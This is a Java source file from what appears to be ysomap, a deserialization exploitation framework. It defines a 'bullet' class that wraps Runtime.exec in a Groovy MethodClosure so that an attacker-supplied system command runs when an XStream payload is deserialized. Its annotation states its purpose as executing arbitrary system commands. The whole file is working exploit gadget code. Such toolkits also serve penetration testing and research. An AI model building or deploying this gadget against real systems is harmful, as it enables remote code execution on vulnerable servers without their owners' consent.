package ysomap.bullets.groovy;

import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
@Bullets
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Details("执行任意系统命令")
@Targets({Targets.XSTREAM})
@Authors({Authors.WH1T3P1G})
public class ClosureWithRuntime1Bullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "command", detail = DetailHelper.COMMAND)
    public String command = null;

    @Override
    public Object getObject() throws Exception {
        Runtime runtime = Runtime.getRuntime();
        return new MethodClosure(runtime, "exec");
    }

    public static Bullet newInstance(Object... args) throws Exception {
        ClosureWithRuntime1Bullet bullet = new ClosureWithRuntime1Bullet();
        bullet.set("command", args[0]);
        return bullet;
    }
}
